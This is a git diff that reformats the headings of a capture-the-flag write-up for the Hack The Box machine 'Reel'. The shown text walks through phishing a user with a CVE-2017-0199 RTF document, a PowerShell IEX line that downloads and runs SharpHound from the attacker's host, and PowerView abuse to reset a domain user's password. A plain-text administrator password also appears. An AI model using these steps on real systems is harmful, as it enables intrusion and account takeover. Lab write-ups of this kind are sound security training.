@@ -5,7 +5,7 @@ title:  "HTB Writeup [Windows - Hard] - Reel"
 
 ![Reel](/assets/Reel/Reel.png)
 
-### Summary
+## Summary
 - A **windows machine** with `Anonymous FTP` allowed. *Inspecting the contents* reveals a **documents folder** one of which tells us that *RTF documents are being reviewed and converted by someone*.
 - *Using this information,* we craft a *malicious document* using **CVE-2017-0199** and send it to a certain user called `nico` via the open `SMTP` port (*We find his username by checking the metadata of the documents on FTP*).
 - *When the document is opened,* we get a shell back as `nico` and start enumerating the machine.
@@ -20,7 +20,7 @@ title:  "HTB Writeup [Windows - Hard] - Reel"
 
 ---
 
-### Nmap
+## Nmap
 *Looking at the* `nmap` *scan,* we find very few ports running:
 ```
 PORT   STATE SERVICE VERSION                                                                                      
@@ -68,7 +68,7 @@ PORT   STATE SERVICE VERSION
 |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
 ```
 
-### Anonymous FTP
+## Anonymous FTP
 *Checking* **FTP**, we come across 3 files:
 - `Applocker.docx`
 - `readme.txt`
@@ -76,14 +76,14 @@ PORT   STATE SERVICE VERSION
 
 ![ftp-listing](/assets/Reel/ftp-listing.jpg)
 
-### Contents of readme.txt
+## Contents of readme.txt
 ```
 please email me any rtf format procedures - I'll review and convert.
 
 new format / converted documents will be saved here.
 ```
 
-### Looks like we're going phishing :D
+## Looks like we're going phishing :D
 the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.
 
 This seems like a **Phishing Challenge**. *In order to exploit,* we need to:
@@ -91,7 +91,7 @@ This seems like a **Phishing Challenge**. *In order to exploit,* we need to:
 2. Find a way to create a malicious RTF file
 3. Find a way to send an email using the open SMTP port
 
-### Enumerating SMTP
+## Enumerating SMTP
 We use a tool called `smtp-user-enum` which lets us find if a given user exists or not.
 
 It uses a couple of **SMTP** commands to do that:
@@ -111,7 +111,7 @@ smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77
 
 That takes a while to run. And it comes up short. *So we move on...*
 
-### Checking file metadata using `exiftool`
+## Checking file metadata using `exiftool`
 
 When we run `exiftool` against the `Windows Event Forwarding.docx` file, we do find a user called `nico` whose email is `nico@megabank.com`
 
@@ -119,7 +119,7 @@ When we run `exiftool` against the `Windows Event Forwarding.docx` file, we do f
 
 we note this down and go verify this user using `smtp-user-enum`
 
-### Trying various SMTP methods for enumeration
+## Trying various SMTP methods for enumeration
 
 *when testing mulitple methods with the* `nico` *user*, we still get no hits :/
 
@@ -133,7 +133,7 @@ But only with the `RCPT` method:
 
 ![nico-rcpt](/assets/Reel/nico-rcpt.jpg)
 
-### Working on the Phish
+## Working on the Phish
 
 Doing a **Google** search shows an article about **CVE-2017-0199** which looks promising.
 
@@ -161,7 +161,7 @@ We host the payload on our kali machine using a standard `python3` webserver and
 
 What's left is to send the email to `nico@megabank.com`
 
-### Sending the mail and some deception ;)
+## Sending the mail and some deception ;)
 We're going to use the `sendEmail` command with a couple flags:
 - `-t <RECEPIENT>`
 - `-f <SENDER>`
@@ -187,7 +187,7 @@ We try to look non-suspicous as possible. And use a subtle message in the body t
 
 ![document-error-2](/assets/Reel/document-error-2.jpg)
 
-### Triggering the exploit chain
+## Triggering the exploit chain
 *Having everything ready,* we trigger the chain:
 
 1. Send the malicious `RTF` file
@@ -196,7 +196,7 @@ We try to look non-suspicous as possible. And use a subtle message in the body t
 
 ![exploit-chain](/assets/Reel/exploit-chain.jpg)
 
-### Brief note on the article content
+## Brief note on the article content
 
 The guide talks about using an `exe` file. We cannot do so because of `Applocker`.
 
@@ -206,7 +206,7 @@ We know this because it was mentioned that the user has set up `Hash Rules` for 
 
 This is why we generated an `HTA` payload using `msfvenom` instead.
 
-### Domain Enumeration using `SharpHound.ps1`
+## Domain Enumeration using `SharpHound.ps1`
 
 *Since running* `.exe` *is disabled by* **Group Policy**, we turn to `BloodHound`'s **PowerShell ingestor** (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
 
@@ -222,7 +222,7 @@ powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000
 
 `powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"`
 
-### A note on `SharpHound.ps1` output:
+## A note on `SharpHound.ps1` output:
 
 `Sharphound.ps1` will generate version 3 `JSON` files. Those *will not be compatible* with the most recent version of **BloodHound** (currently it's at 4).
 
@@ -230,7 +230,7 @@ powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000
 
 *To get it working,* we will need to get `BloodHound` version 3 from the **Official Releases Page** (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)
 
-### Investigating Possible Exploit Paths
+## Investigating Possible Exploit Paths
 
 *Upon looking at* `BloodHound`'s *output,* we notice that `nico` can set the `owner` for user `herman`
 
@@ -242,7 +242,7 @@ This is because the `herman` user has a `WriteDACL` right over it.
 
 ![herman-has-write-dacl](/assets/Reel/herman-has-write-dacl.jpg)
 
-### Abusing `nico`'s `WriteOwner` right over `herman`
+## Abusing `nico`'s `WriteOwner` right over `herman`
 
 *Checking the help for the* `WriteOwner` *right*, we notice we can use `PowerView`'s `Set-DomainObjectOwner` function.
 
@@ -276,7 +276,7 @@ and set the password:
 Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword
 ```
 
-### Logging in as herman and joining the `backup_admins` group
+## Logging in as herman and joining the `backup_admins` group
 
 *After resetting the password for* `herman`, we're able to login via the open `SSH` port:
 
@@ -286,7 +286,7 @@ and we can add ourselves to the `backup_admins` group easily with `Add-ADGroupMe
 
 ![joining-backup-admins](/assets/Reel/joining-backup-admins.jpg)
 
-### File System access with `backup_admins`'s group membership
+## File System access with `backup_admins`'s group membership
 
 We first *relog* to *refresh our access* and check our newly-found acccess using `PowerShell`:
 
@@ -308,7 +308,7 @@ Using the password `Cr4ckMeIfYouC4n!` works with the administrator user over `SS
 
 ![got-admin-path-1](/assets/Reel/got-admin-path-1.jpg)
 
-### Exploit Path #2: `nico` -> `tom` -> `claire` > `backup_admins`
+## Exploit Path #2: `nico` -> `tom` -> `claire` > `backup_admins`
 
 On `nico`'s desktop we find a file called `cred.xml`
 
@@ -340,7 +340,7 @@ The password works for `tom` using `SSH`
 
 ![claire-to-backup-admins](/assets/Reel/claire-to-backup-admins.jpg)
 
-### Exploit Path #3: Metasploitation
+## Exploit Path #3: Metasploitation
 
 The same exploit for **CVE-2017-0199** exists in a **Metasploit Module** (`windows/fileformat/office_word_hta`) when we search using the `rtf` keyword:
 
@@ -378,7 +378,7 @@ another exploit that worked is `CVE-2018-8440`
 
 Of course these paths are not intended because it's just using `MetaSploit`
 
-### Exploit Path #4 (Incomplete): Abusing `SeLoadDriverPrivilege`
+## Exploit Path #4 (Incomplete): Abusing `SeLoadDriverPrivilege`
 
 The `tom` user is a member of the `Print Operators` Group which hold the `SeLoadDriverPrivilege`
 
